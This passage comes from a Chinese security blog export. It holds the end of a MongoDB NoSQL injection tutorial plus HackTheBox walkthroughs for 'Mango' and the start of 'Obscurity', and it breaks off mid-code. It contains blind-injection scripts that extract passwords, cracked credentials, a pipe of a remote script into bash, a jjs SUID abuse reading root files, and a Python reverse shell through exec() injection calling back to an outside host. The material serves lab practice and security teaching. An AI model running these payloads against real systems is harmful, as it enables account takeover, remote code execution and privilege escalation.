&#123;&quot;$regex&quot;: &quot;^ca&quot; &#125;&#125;&#123;&quot;username&quot;: &#123;&quot;$eq&quot;: &quot;ca01h&quot;&#125;, &quot;password&quot;: &#123;&quot;$regex&quot;: &quot;^ca0&quot; &#125;&#125; 当然，提到盲注肯定少不了脚本： 123456789101112131415161718import requestsimport urllib3import stringimport urlliburllib3.disable_warnings()username = &#x27;admin&#x27;password = &#x27;&#x27;target = &#x27;http://127.0.0.1/mongo/test.php&#x27;while True: for c in string.printable: if c not in [&#x27;*&#x27;, &#x27;+&#x27;, &#x27;.&#x27;, &#x27;?&#x27;, &#x27;|&#x27;, &#x27;#&#x27;, &#x27;&amp;&#x27;, &#x27;$&#x27;]: payload = &#x27;?username=%s&amp;password[$regex]=^%s&#x27; % (username, password + c) r = requests.get(target + payload) if &#x27;OK&#x27; in r.text: print(&quot;Found one more char : %s&quot; % (password+c)) password += c 爆破密码结果如下： 类似的还有POST的版本： 12345678910111213141516171819import requestsimport urllib3import stringimport urlliburllib3.disable_warnings()username=&quot;admin&quot;password=&quot;&quot;target = &#x27;http://127.0.0.1/mongo/test.php&#x27;headers = &#123;&#x27;content-type&#x27;: &#x27;application/json&#x27;&#125;while True: for c in string.printable: if c not in [&#x27;*&#x27;,&#x27;+&#x27;,&#x27;.&#x27;,&#x27;?&#x27;,&#x27;|&#x27;]: payload = &#x27;&#123;&quot;username&quot;: &#123;&quot;$eq&quot;: &quot;%s&quot;&#125;, &quot;password&quot;: &#123;&quot;$regex&quot;: &quot;^%s&quot; &#125;&#125;&#x27; % (username, password + c) r = requests.post(target, data = payload, headers = headers, verify = False, allow_redirects = False) if &#x27;OK&#x27; in r.text or r.status_code == 302: print(&quot;Found one more char : %s&quot; % (password+c)) password += c 当然这里的脚本还是有一些改进的地方，比如可以首先判断用户名或密码长度，而且上面代码去掉了一些特殊字符等等的。这里就不再多做演示了，刚好下面有一个实例靶机是需要写Python脚本盲注MongoDB，那个代码考虑的问题更多，可以稍微看一下。 0x04 Node.JS MongoDB注入 技巧跟PHP MongoDB是类似的，这里就提供一些Node.JS的靶场给大家练练手： https://pockr.org/bug-environment/detail?environment_no=env_75b82b98ffedbe0035 https://github.com/ricardojoserf/NoSQL-injection-example 0x05 MongoDB 注入实例 CTF NopeSQL 靶机地址：https://cybrics.net/tasks/nopesql 扫描网站发现有Git源码泄露，用GitHack工具获得index.php源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687&lt;?phprequire_once __DIR__ . &quot;&#x2F;vendor&#x2F;autoload.php&quot;;function auth($username, $password) &#123; $collection &#x3D; (new MongoDB\\Client(&#39;mongodb:&#x2F;&#x2F;localhost:27017&#x2F;&#39;))-&gt;test-&gt;users; $raw_query &#x3D; &#39;&#123;&quot;username&quot;: &quot;&#39;.$username.&#39;&quot;, &quot;password&quot;: &quot;&#39;.$password.&#39;&quot;&#125;&#39;; $document &#x3D; $collection-&gt;findOne(json_decode($raw_query)); if (isset($document) &amp;&amp; isset($document-&gt;password)) &#123; return true; &#125; return false;&#125;$user &#x3D; false;if (isset($_COOKIE[&#39;username&#39;]) &amp;&amp; isset($_COOKIE[&#39;password&#39;])) &#123; $user &#x3D; auth($_COOKIE[&#39;username&#39;], $_COOKIE[&#39;password&#39;]);&#125;if (isset($_POST[&#39;username&#39;]) &amp;&amp; isset($_POST[&#39;password&#39;])) &#123; $user &#x3D; auth($_POST[&#39;username&#39;], $_POST[&#39;password&#39;]); if ($user) &#123; setcookie(&#39;username&#39;, $_POST[&#39;username&#39;]); setcookie(&#39;password&#39;, $_POST[&#39;password&#39;]); &#125;&#125;?&gt;&lt;?php if ($user &#x3D;&#x3D; true): ?&gt; Welcome! &lt;div&gt; Group most common news by &lt;a href&#x3D;&quot;?filter&#x3D;$category&quot;&gt;category&lt;&#x2F;a&gt; | &lt;a href&#x3D;&quot;?filter&#x3D;$public&quot;&gt;publicity&lt;&#x2F;a&gt;&lt;br&gt; &lt;&#x2F;div&gt; &lt;?php $filter &#x3D; $_GET[&#39;filter&#39;]; $collection &#x3D; (new MongoDB\\Client(&#39;mongodb:&#x2F;&#x2F;localhost:27017&#x2F;&#39;))-&gt;test-&gt;news; $pipeline &#x3D; [ [&#39;$group&#39; &#x3D;&gt; [&#39;_id&#39; &#x3D;&gt; &#39;$category&#39;, &#39;count&#39; &#x3D;&gt; [&#39;$sum&#39; &#x3D;&gt; 1]]], [&#39;$sort&#39; &#x3D;&gt; [&#39;count&#39; &#x3D;&gt; -1]], [&#39;$limit&#39; &#x3D;&gt; 5], ]; $filters &#x3D; [ [&#39;$project&#39; &#x3D;&gt; [&#39;category&#39; &#x3D;&gt; $filter]] ]; $cursor &#x3D; $collection-&gt;aggregate(array_merge($filters, $pipeline)); ?&gt; &lt;?php if (isset($filter)): ?&gt; &lt;?php foreach ($cursor as $category) &#123; printf(&quot;%s has %d news&lt;br&gt;&quot;, $category[&#39;_id&#39;], $category[&#39;count&#39;]); &#125; ?&gt; &lt;?php endif; ?&gt;&lt;?php else: ?&gt; &lt;?php if (isset($_POST[&#39;username&#39;]) &amp;&amp; isset($_POST[&#39;password&#39;])): ?&gt; Invalid username or password &lt;?php endif; ?&gt; &lt;form action&#x3D;&#39;&#x2F;&#39; method&#x3D;&quot;POST&quot;&gt; &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot;&gt; &lt;input type&#x3D;&quot;password&quot; name&#x3D;&quot;password&quot;&gt; &lt;input type&#x3D;&quot;submit&quot;&gt; &lt;&#x2F;form&gt; &lt;h2&gt;News&lt;&#x2F;h2&gt; &lt;?php $collection &#x3D; (new MongoDB\\Client(&#39;mongodb:&#x2F;&#x2F;localhost:27017&#x2F;&#39;))-&gt;test-&gt;news; $cursor &#x3D; $collection-&gt;find([&#39;public&#39; &#x3D;&gt; 1]); foreach ($cursor as $news) &#123; printf(&quot;%s&lt;br&gt;&quot;, $news[&#39;title&#39;]); &#125; ?&gt;&lt;?php endif; ?&gt; 第一步是利用重言式注入登录，但是有点不同的是，输入的参数被双引号包括，所以我们必须想办法闭合这个双引号，payload： 1username&#x3D;1&amp;password&#x3D;&quot;,&quot;password&quot;:&#123;&quot;$ne&quot;&#x3D;null&#125;, &quot;username&quot;:admin&quot; 这里如果直接使用&#123;&quot;$ne&quot;:null&#125;会出现500的错误： 12345678910代码：var_dump(json_decode($raw_query));输出:object(stdClass)#1 (2) &#123; [&quot;username&quot;]&#x3D;&gt; string(12) &quot;&#123;&#39;$ne&#39;:null&#125;&quot; [&quot;password&quot;]&#x3D;&gt; string(12) &quot;&#123;&#39;$ne&#39;:null&#125;&quot;&#125; 发现&#123;'$ne':null&#125;被解析成了string而不是array。前一个payload虽然username和password重复了，但json_decode时变量只会是最后一次的赋值。 登录成功后 filter参数里可以填 category展示目录 text展示内容 title展示标题，但是都限制了5条。 代码里是用的MongoDB聚合函数aggregate，下面这张图也是来自官方文档解释了aggregate函数的执行过程： 使用aggregate聚合函数时，在里面是可以使用条件判断语句的。在MongoDB中$cond表示if判断语句，匹配的符号使用$eq，连起来为[$cond][if][$eq]，当使用多个判断条件时重复该语句即可。 官方文档列出的$cond的用法： 官方文档的例子： 1234567891011121314db.inventory.aggregate( [ &#123; $project: &#123; item: 1, discount: &#123; $cond: &#123; if: &#123; $gte: [ &quot;$qty&quot;, 250 ] &#125;, then: 30, else: 20 &#125; &#125; &#125; &#125; ]) 现在我们的目的是：如果$category的值是flag，那么就输出$title的内容，否则还是原样输出$catagory，照着上面的例子写成MongoDB shell的形式就是： 12345678910111213db.news.aggregate( [ &#123; $project: &#123; category: &#123; $cond: &#123; if: &#123; $eq: [ &quot;$category&quot;, &quot;flags&quot; ] &#125;, then: $title, else: $category &#125; &#125; &#125; &#125; ]) 转换成PHP数组形式传入filter参数： 1?filter[$cond][if][$eq][]&#x3D;flags&amp;filter[$cond][if][$eq][]&#x3D;$category&amp;filter[$cond][then]&#x3D;$title&amp;filter[$cond][else]&#x3D;$category 转换成raw_query的形式： 1234567891011121314&#123; &quot;category&quot;: &#123; &quot;$cond&quot;: &#123; &quot;if&quot;: &#123; &quot;$eq&quot;: [ &quot;$category&quot;, &quot;flags&quot; ] &#125;, &quot;then&quot;: &quot;$title&quot;, &quot;else&quot;: &quot;$category&quot; &#125; &#125;&#125; var_dump(json_decode(raw_query))即为： 12345678910111213141516171819202122object(stdClass)#4 (1) &#123; [&quot;category&quot;]&#x3D;&gt; object(stdClass)#3 (1) &#123; [&quot;$cond&quot;]&#x3D;&gt; object(stdClass)#2 (3) &#123; [&quot;if&quot;]&#x3D;&gt; object(stdClass)#1 (1) &#123; [&quot;$eq&quot;]&#x3D;&gt; array(2) &#123; [0]&#x3D;&gt; string(9) &quot;$category&quot; [1]&#x3D;&gt; string(5) &quot;flags&quot; &#125; &#125; [&quot;then&quot;]&#x3D;&gt; string(6) &quot;$title&quot; [&quot;else&quot;]&#x3D;&gt; string(9) &quot;$category&quot; &#125; &#125;&#125; 接着直接修改$title为$text查看： 成功拿到flag~ HTB Mongo 最近做了一个HackTheBox的靶机，主要考察的就是写脚本盲注MongoDB，限于篇幅原因，就不把walkthrough贴在这里了，感兴趣的同学可以移步于此。 0x06 工具 Github上有个叫NoSQLAttack工具，不过已经没有维护了。 另外还有一个NoSQLMap工具，这个项目作者仍在维护。 0x07 参考资料 https://www.runoob.com/mongodb/ https://pockr.org/activity/detail?activity_no=act_761e1e744d8aa16823#sp_26a751c506f61078b0 https://www.mi1k7ea.com/2019/08/11/NoSQL注入之MongoDB/#0x03-NoSQL注入 https://www.tr0y.wang/2019/04/21/MongoDB注入指北/index.html https://nullsweep.com/a-nosql-injection-primer-with-mongo/ https://zanon.io/posts/nosql-injection-in-mongodb","tags":[{"name":"Web安全学习","slug":"Web安全学习","permalink":"http://ca0y1h.top/tags/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/"},{"name":"NoSQL注入","slug":"NoSQL注入","permalink":"http://ca0y1h.top/tags/NoSQL%E6%B3%A8%E5%85%A5/"}],"categories":[{"name":"Web安全","slug":"Web安全","permalink":"http://ca0y1h.top/categories/Web%E5%AE%89%E5%85%A8/"},{"name":"基础学习","slug":"Web安全/基础学习","permalink":"http://ca0y1h.top/categories/Web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"}]},{"title":"HTB::Mongo Walkthrough","date":"2020-03-17T14:02:06.000Z","path":"Target_drone/HackTheBox/5.HTB-Mongo-walkthrough/","text":"HTB::Mongo Walkthrough 0x01 Information 0x02 Tools and Tips Nmap LinEnum.sh gtfobins MongoDB注入 0x03 Pentesting Nmap扫描靶机端口 123456789101112131415161718192021222324252627kali@kali ~ % nmap -A -Pn -T4 -p- 10.10.10.162Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2020-03-11 02:44 UTCNmap scan report for 10.10.10.162Host is up (0.060s latency).Not shown: 65532 closed portsPORT STATE SERVICE VERSION22&#x2F;tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 (RSA)| 256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf (ECDSA)|_ 256 90:70:fb:6f:38:ae:dc:3b:0b:31:68:64:b0:4e:7d:c9 (ED25519)80&#x2F;tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache&#x2F;2.4.29 (Ubuntu)|_http-title: 403 Forbidden443&#x2F;tcp open ssl&#x2F;http Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache&#x2F;2.4.29 (Ubuntu)|_http-title: Mango | Search Base| ssl-cert: Subject: commonName&#x3D;staging-order.mango.htb&#x2F;organizationName&#x3D;Mango Prv Ltd.&#x2F;stateOrProvinceName&#x3D;None&#x2F;countryName&#x3D;IN| Not valid before: 2019-09-27T14:21:19|_Not valid after: 2020-09-26T14:21:19|_ssl-date: TLS randomness does not represent time| tls-alpn: |_ http&#x2F;1.1Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernelService detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .Nmap done: 1 IP address (1 host up) scanned in 44.12 seconds 主要来看443端口，用https访问： 这个页面好像除了Analytics之外其他都是摆设 研究了会发现这个Analytics也是一个摆设，orz。。。回去再看看nmap扫描出来的端口又发现了一个信息 12ssl-cert: Subject: commonName&#x3D;staging-order.mango.htb&#x2F;organizationName&#x3D;Mango PrvLtd.&#x2F;stateOrProvinceName&#x3D;None&#x2F;countryName&#x3D;IN commonName: 公用名称，一般为网站域名 编辑/etc/hosts文件添加解析： 110.10.10.162 staging-order.mango.htb 看到了一个登录界面 好吧，这里有点坑，是基于MongoDB的NoSQL注入，试一下这里的Payload：https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL Injection 注入成功后是这种界面： 没有什么可以利用的，现在回过头去爆破用户和密码，脚本如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879import stringimport requestsurl = &quot;http://staging-order.mango.htb/index.php&quot;headers = &#123;&quot;Host&quot;: &quot;staging-order.mango.htb&quot;&#125;possible_chars = list(string.ascii_letters) + list(string.digits) + [&quot;\\\\&quot; + c for c in string.punctuation]def main(): usernames = get_users() if usernames: print(&#x27;Finished!&#x27;) for username in usernames: password = get_password(username) print(&#x27;&#123;&#125;:&#123;&#125;&#x27;.format(username, password)) else: print(&#x27;Not Found!&#x27;)def get_users(): usernames = [] payload = &#123;&quot;username[$regex]&quot;:&quot;&quot;,&quot;password[$regex]&quot;:&quot;.*&quot;, &quot;login&quot;:&quot;login&quot;&#125; for c in possible_chars: username = &quot;^&quot; + c payload[&quot;username[$regex]&quot;] = username + &quot;.*&quot; r = requests.post(url, data=payload, headers=headers, allow_redirects=False) if r.status_code == 302: print(&quot;username start with character:&quot; + c) for x in range(0, get_username_length() - 1): for c2 in possible_chars: payload[&quot;username[$regex]&quot;] = username + c2 + &quot;.*&quot; r2 = requests.post(url, data=payload, headers=headers, allow_redirects=False) if r2.status_code == 302: username += c2 print(username[1:]) break #if c2 == possible_chars[-1]: print(&quot;Found username: &#123;&#125;&quot;.format(username[1:])) usernames.append(username[1:]) return usernamesdef get_password(username): payload = &#123;&quot;username&quot;: username, &quot;password[$regex]&quot;: &quot;&quot;, &quot;login&quot;: &quot;login&quot;&#125; password = &quot;^&quot; for x in range(0, get_pass_length(username)): for c in possible_chars: payload[&quot;password[$regex]&quot;] = password + c + &quot;.*&quot; r = requests.post(url, data=payload, headers=headers, allow_redirects=False) if r.status_code == 302: password += c print(password[1:]) break password = password[1:].replace(&quot;\\\\&quot;, &quot;&quot;) print(&quot;Found &#123;&#125;&#x27;s password: &quot;.format(username) + password) return passworddef get_username_length(): length = 1 while True: payload = &#123;&quot;username[$regex]&quot;: &quot;.&#123;&#123;&#123;&#125;&#125;&#125;&quot;.format(length), &quot;password[$ne]&quot;:&quot;&quot;, &quot;login&quot;:&quot;login&quot;&#125; r =requests.post(url, data=payload, headers=headers, allow_redirects=False) if r.status_code == 302: length += 1 else: return length -1def get_pass_length(username): length = 1 while True: payload = &#123;&quot;username&quot;: username, &quot;password[$regex]&quot;: &quot;.&#123;&#123;&#123;&#125;&#125;&#125;&quot;.format(length), &quot;login&quot;: &quot;login&quot;&#125; r = requests.post(url, data=payload, headers=headers, allow_redirects=False) if r.status_code == 302: length += 1 else: return length -1if __name__ == &#x27;__main__&#x27;: main() 运行结果如下： 得到两个账户和密码： 12mango:h3mXK8RhU~f&#123;]f5Hadmin:t9KcS3&gt;!0B#2 登录mongo账户 123456789101112131415161718root@kali:~&#x2F;HTB&#x2F;Boxes&#x2F;Mango# ssh mango@10.10.10.162mango@10.10.10.162&#39;s password:&lt;...&gt;Last login: Mon Nov 11 20:58:31 2019 from 10.10.14.7mango@mango:~$ su adminPassword:$ whoamiadmin$ cd &#x2F;home&#x2F;admin$ ls -latotal 24drwxr-xr-x 2 admin admin 4096 Sep 30 03:20 .drwxr-xr-x 4 root root 4096 Sep 27 14:02 ..lrwxrwxrwx 1 admin admin 9 Sep 27 14:30 .bash_history -&gt; &#x2F;dev&#x2F;null-rw-r--r-- 1 admin admin 220 Apr 4 2018 .bash_logout-rw-r--r-- 1 admin admin 3771 Apr 4 2018 .bashrc-rw-r--r-- 1 admin admin 807 Apr 4 2018 .profile-r-------- 1 admin admin 33 Sep 27 14:29 user.txt 跑一个LinEnum.sh提权脚本看有没有什么可以利用的 123456admin@mango:&#x2F;home&#x2F;admin$ curl 10.10.14.42:80&#x2F;LinEnum.sh | bash&lt;...&gt;[-] SGID files:&lt;...&gt;-rwsr-sr-- 1 root admin 10352 Jul 18 18:21 &#x2F;usr&#x2F;lib&#x2F;jvm&#x2F;java-11-openjdkamd64&#x2F;bin&#x2F;jjs 也可以使用命令：find / -user root -perm -4000 2&gt;/dev/null 查看利用方式：https://gtfobins.github.io/gtfobins/jjs/ 1234567admin@mango:&#x2F;home&#x2F;admin$ jjsWarning: The jjs tool is planned to be removed from a future JDK releasejjs&gt; var BufferedReader &#x3D; Java.type(&quot;java.io.BufferedReader&quot;);jjs&gt; var FileReader &#x3D; Java.type(&quot;java.io.FileReader&quot;);jjs&gt; var br &#x3D; new BufferedReader(new FileReader(&quot;&#x2F;root&#x2F;root.txt&quot;));jjs&gt; while ((line &#x3D; br.readLine()) !&#x3D; null) &#123; print(line); &#125;;8a8efXXXXXXXXXXXXXXXXXXXXXXXXXb15 0x04 Summary Mongo是一个主要考察NoSQL注入的的靶机，听这个靶机的名字就感觉数据库用的是MongoDB，为此笔者专门写了一个关于NoSQL注入之MongoDB文章，感兴趣的同学可以去看一看。这次主要考察NoSQL的盲注技巧，其实也没什么技巧，主要还是写脚本的能力吧，感觉还是不太行，需要调试很多次才能pass，但相信先模仿后创造，坚持自己动手写，应该还是没问题的。","tags":[{"name":"靶机","slug":"靶机","permalink":"http://ca0y1h.top/tags/%E9%9D%B6%E6%9C%BA/"}],"categories":[{"name":"靶机","slug":"靶机","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/"},{"name":"HTB","slug":"靶机/HTB","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/HTB/"}]},{"title":"HTB::Obscurity Walkthrough","date":"2020-03-09T02:45:28.000Z","path":"Target_drone/HackTheBox/4.HTB-Obscurity-walkthrough/","text":"HTB::Obscurity Walkthrough 0x01 Introduction 0x02 Tools and Tips nmap wfuzz Python代码审计 代码执行漏洞 0x03 Pentesting Nmap扫描端口发现开放了 8080 的web端口 页面提示有一个源码泄露 1Message to server devs: the current source code for the web server is in &#39;SuperSecureServer.py&#39; in the secret development directory 那我们就需要爆破目录了，使用 wfuzz 1sudo wfuzz -c -z file,common.txt -u http://10.10.10.168:8080/FUZZ/SuperSecureServer.py 得到服务器源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169import socketimport threadingfrom datetime import datetimeimport sysimport osimport mimetypesimport urllib.parseimport subprocessrespTemplate = &quot;&quot;&quot;HTTP/1.1 &#123;statusNum&#125; &#123;statusCode&#125;Date: &#123;dateSent&#125;Server: &#123;server&#125;Last-Modified: &#123;modified&#125;Content-Length: &#123;length&#125;Content-Type: &#123;contentType&#125;Connection: &#123;connectionType&#125;&#123;body&#125;&quot;&quot;&quot;DOC_ROOT = &quot;DocRoot&quot;CODES = &#123;&quot;200&quot;: &quot;OK&quot;, &quot;304&quot;: &quot;NOT MODIFIED&quot;, &quot;400&quot;: &quot;BAD REQUEST&quot;, &quot;401&quot;: &quot;UNAUTHORIZED&quot;, &quot;403&quot;: &quot;FORBIDDEN&quot;, &quot;404&quot;: &quot;NOT FOUND&quot;, &quot;500&quot;: &quot;INTERNAL SERVER ERROR&quot;&#125;MIMES = &#123;&quot;txt&quot;: &quot;text/plain&quot;, &quot;css&quot;:&quot;text/css&quot;, &quot;html&quot;:&quot;text/html&quot;, &quot;png&quot;: &quot;image/png&quot;, &quot;jpg&quot;:&quot;image/jpg&quot;, &quot;ttf&quot;:&quot;application/octet-stream&quot;,&quot;otf&quot;:&quot;application/octet-stream&quot;, &quot;woff&quot;:&quot;font/woff&quot;, &quot;woff2&quot;: &quot;font/woff2&quot;, &quot;js&quot;:&quot;application/javascript&quot;,&quot;gz&quot;:&quot;application/zip&quot;, &quot;py&quot;:&quot;text/plain&quot;, &quot;map&quot;: &quot;application/octet-stream&quot;&#125;class Response: def __init__(self, **kwargs): self.__dict__.update(kwargs) now = datetime.now() self.dateSent = self.modified = now.strftime(&quot;%a, %d %b %Y %H:%M:%S&quot;) def stringResponse(self): return respTemplate.format(**self.__dict__)class Request: def __init__(self, request): self.good = True try: request = self.parseRequest(request) self.method = request[&quot;method&quot;] self.doc = request[&quot;doc&quot;] self.vers = request[&quot;vers&quot;] self.header = request[&quot;header&quot;] self.body = request[&quot;body&quot;] except: self.good = False def parseRequest(self, request): req = request.strip(&quot;\\r&quot;).split(&quot;\\n&quot;) method,doc,vers = req[0].split(&quot; &quot;) header = req[1:-3] body = req[-1] headerDict = &#123;&#125; for param in header: pos = param.find(&quot;: &quot;) key, val = param[:pos], param[pos+2:] headerDict.update(&#123;key: val&#125;) return &#123;&quot;method&quot;: method, &quot;doc&quot;: doc, &quot;vers&quot;: vers, &quot;header&quot;: headerDict, &quot;body&quot;: body&#125;class Server: def __init__(self, host, port): self.host = host self.port = port self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) self.sock.bind((self.host, self.port)) def listen(self): self.sock.listen(5) while True: client, address = self.sock.accept() client.settimeout(60) threading.Thread(target = self.listenToClient,args = (client,address)).start() def listenToClient(self, client, address): size = 1024 while True: try: data = client.recv(size) if data: # Set the response to echo back the recieved data req = Request(data.decode()) self.handleRequest(req, client, address) client.shutdown() client.close() else: raise error(&#x27;Client disconnected&#x27;) except: client.close() return False def handleRequest(self, request, conn, address): if request.good:# try: # print(str(request.method) + &quot; &quot; + str(request.doc), end=&#x27; &#x27;) # print(&quot;from &#123;0&#125;&quot;.format(address[0]))# except Exception as e:# print(e) document = self.serveDoc(request.doc, DOC_ROOT) statusNum=document[&quot;status&quot;] else: document = self.serveDoc(&quot;/errors/400.html&quot;, DOC_ROOT) statusNum=&quot;400&quot; body = document[&quot;body&quot;] statusCode=CODES[statusNum] dateSent = &quot;&quot; server = &quot;BadHTTPServer&quot; modified = &quot;&quot; length = len(body) contentType = document[&quot;mime&quot;] # Try and identify MIME type from string connectionType = &quot;Closed&quot; resp = Response( statusNum=statusNum, statusCode=statusCode, dateSent = dateSent, server = server, modified = modified, length = length, contentType = contentType, connectionType = connectionType, body = body ) data = resp.stringResponse() if not data: return -1 conn.send(data.encode()) return 0 def serveDoc(self, path, docRoot): path = urllib.parse.unquote(path) try: info = &quot;output = &#x27;Document: &#123;&#125;&#x27;&quot; # Keep the output for later debug exec(info.format(path)) # This is how you do string formatting, right? cwd = os.path.dirname(os.path.realpath(__file__)) docRoot = os.path.join(cwd, docRoot) if path == &quot;/&quot;: path = &quot;/index.html&quot; requested = os.path.join(docRoot, path[1:]) if os.path.isfile(requested): mime = mimetypes.guess_type(requested) mime = (mime if mime[0] != None else &quot;text/html&quot;) mime = MIMES[requested.split(&quot;.&quot;)[-1]] try: with open(requested, &quot;r&quot;) as f: data = f.read() except: with open(requested, &quot;rb&quot;) as f: data = f.read() status = &quot;200&quot; else: errorPage = os.path.join(docRoot, &quot;errors&quot;, &quot;404.html&quot;) mime = &quot;text/html&quot; with open(errorPage, &quot;r&quot;) as f: data = f.read().format(path) status = &quot;404&quot; except Exception as e: print(e) errorPage = os.path.join(docRoot, &quot;errors&quot;, &quot;500.html&quot;) mime = &quot;text/html&quot; with open(errorPage, &quot;r&quot;) as f: data = f.read() status = &quot;500&quot; return &#123;&quot;body&quot;: data, &quot;mime&quot;: mime, &quot;status&quot;: status&#125; 审计源码，大致说一下代码的含义，开启socket监听，接收到http请求，调用 Request 类的 parseRequest 方法做分割，然后调用 handleRequest 处理请求，通过 serveDoc 处理请求的文档。 查找敏感函数发现关键点： 1234567def serveDoc(self, path, docRoot): path = urllib.parse.unquote(path) try: info = &quot;output = &#x27;Document: &#123;&#125;&#x27;&quot; # Keep the output for later debug exec(info.format(path)) # This is how you do string formatting, right? cwd = os.path.dirname(os.path.realpath(__file__)) docRoot = os.path.join(cwd, docRoot) 这里的path是污点参数，exec函数存在命令注入： 1path = &quot;\\&#x27;;os.system(&#x27;whoami&#x27;)#&quot; 然后通过python反弹shell： 123456789101112131415import requestsimport urllibimport osurl = &#x27;http://10.10.10.168:8080/&#x27;path=&#x27;5\\&#x27;&#x27;+&#x27;\\nimport socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.146&quot;,9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;])\\na=\\&#x27;&#x27;payload = urllib.parse.quote(path)print(&quot;payload&quot;)print(url+payload)r= requests.get(url+payload)print(r.headers)print(r.text) Python 反弹shell讲解：https://www.leavesongs.com/PYTHON/python-shell-backdoor.html 进入robert目录： 查看敏感文件 check.txt 1Encrypting this file with your key should result in out.txt, make sure your key is correct! chect.txt加密后的结果是out.txt 1234567891011121314www-data@obscure:&#x2F;home&#x2F;robert$ xxd out.txtxxd out.txt00000000: c2a6 c39a c388 c3aa c39a c39e c398 c39b ................00000010: c39d c39d c289 c397 c390 c38a c39f c285 ................00000020: c39e c38a c39a c389 c292 c3a6 c39f c39d ................00000030: c38b c288 c39a c39b c39a c3aa c281 c399 ................00000040: c389 c3ab c28f c3a9 c391 c392 c39d c38d ................00000050: c390 c285 c3aa c386 c3a1 c399 c39e c3a3 ................00000060: c296 c392 c391 c288 c390 c3a1 c399 c2a6 ................00000070: c395 c3a6 c398 c29e c28f c3a3 c38a c38e ................00000080: c38d c281 c39f c39a c3aa c386 c28e c39d ................00000090: c3a1 c3a4 c3a8 c289 c38e c38d c39a c28c ................000000a0: c38e c3ab c281 c391 c393 c3a4 c3a1 c39b ................000000b0: c38c c397 c289 c281 76 ........v passwordreminder.txt 1234www-data@obscure:&#x2F;home&#x2F;robert$ xxd passwordreminder.txtxxd passwordreminder.txt00000000: c2b4 c391 c388 c38c c389 c3a0 c399 c381 ................00000010: c391 c3a9 c2af c2b7 c2bf 6b ..........k SuperSecureCrypt.py 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485import sysimport argparsedef encrypt(text, key): keylen = len(key) keyPos = 0 encrypted = &quot;&quot; for x in text: keyChr = key[keyPos] newChr = ord(x) newChr = chr((newChr + ord(keyChr)) % 255) encrypted += newChr keyPos += 1 keyPos = keyPos % keylen return encrypteddef decrypt(text, key): keylen = len(key) keyPos = 0 decrypted = &quot;&quot; for x in text: keyChr = key[keyPos] newChr = ord(x) newChr = chr((newChr - ord(keyChr)) % 255) decrypted += newChr keyPos += 1 keyPos = keyPos % keylen return decryptedparser = argparse.ArgumentParser(description=&#x27;Encrypt with 0bscura\\&#x27;s encryption algorithm&#x27;)parser.add_argument(&#x27;-i&#x27;, metavar=&#x27;InFile&#x27;, type=str, help=&#x27;The file to read&#x27;, required=False)parser.add_argument(&#x27;-o&#x27;, metavar=&#x27;OutFile&#x27;, type=str, help=&#x27;Where to output the encrypted/decrypted file&#x27;, required=False)parser.add_argument(&#x27;-k&#x27;, metavar=&#x27;Key&#x27;, type=str, help=&#x27;Key to use&#x27;, required=False)parser.add_argument(&#x27;-d&#x27;, action=&#x27;store_true&#x27;, help=&#x27;Decrypt mode&#x27;)args = parser.parse_args()banner = &quot;################################\\n&quot;banner+= &quot;# BEGINNING #\\n&quot;banner+= &quot;# SUPER SECURE ENCRYPTOR #\\n&quot;banner+= &quot;################################\\n&quot;banner += &quot; ############################\\n&quot;banner += &quot; # FILE MODE #\\n&quot;banner += &quot; ############################&quot;print(banner)if args.o == None or args.k == None or args.i == None: print(&quot;Missing args&quot;)else: if args.d: print(&quot;Opening file &#123;0&#125;...&quot;.format(args.i)) with open(args.i, &#x27;r&#x27;, encoding=&#x27;UTF-8&#x27;) as f: data = f.read() print(&quot;Decrypting...&quot;) decrypted = decrypt(data, args.k) print(&quot;Writing to &#123;0&#125;...&quot;.format(args.o)) with open(args.o, &#x27;w&#x27;, encoding=&#x27;UTF-8&#x27;) as f: f.write(decrypted) else: print(&quot;Opening file &#123;0&#125;...&quot;.format(args.i)) with open(args.i, &#x27;r&#x27;, encoding=&#x27;UTF-8&#x27;) as f: data = f.read() print(&quot;Encrypting...&quot;) encrypted = encrypt(data, args.k) print(&quot;Writing to &#123;0&#125;...&quot;.format(args.o)) with open(args.o, &#x27;w&#x27;, encoding=&#x27;UTF-8&#x27;) as f: f.write(encrypted) BetterSSH.py 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263import sysimport random, stringimport osimport timeimport cryptimport tracebackimport subprocesspath = &#x27;&#x27;.join(random.choices(string.ascii_letters + string.digits, k=8))session = &#123;&quot;user&quot;: &quot;&quot;, &quot;authenticated&quot;: 0&#125;try: session[&#x27;user&#x27;] = 